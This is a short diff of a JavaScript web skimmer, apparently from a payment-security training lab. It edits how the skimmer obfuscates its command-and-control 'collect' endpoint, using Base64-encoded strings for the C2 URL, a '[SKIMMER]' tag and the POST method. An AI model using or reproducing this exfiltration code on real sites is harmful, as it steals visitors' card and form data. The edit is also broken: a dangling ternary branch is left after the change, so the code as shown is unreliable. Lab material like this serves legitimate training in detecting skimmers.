@@ -266,9 +266,9 @@
 
     // Obfuscated configuration using Base64 and string concatenation
     // Dynamically determine C2 URL based on environment
-    var hostname = window.location.hostname
-    var d = (hostname.indexOf('run.app') !== -1 || hostname.indexOf('pcioasis.com') !== -1)
-      ? window.location.origin + '/' + atob('Y29sbGVjdA==')
+    // Use relative path for C2 exfiltration (works in all environments via Traefik)
+    // Traefik routes /lab1/c2/collect to C2 server
+    var d = '/lab1/c2/' + atob('Y29sbGVjdA==')
       : atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA==') // http://localhost:3000/collect
     var e = atob('W1NLSU1NRVJd') // [SKIMMER]
     var f = atob('UE9TVA==') // POST
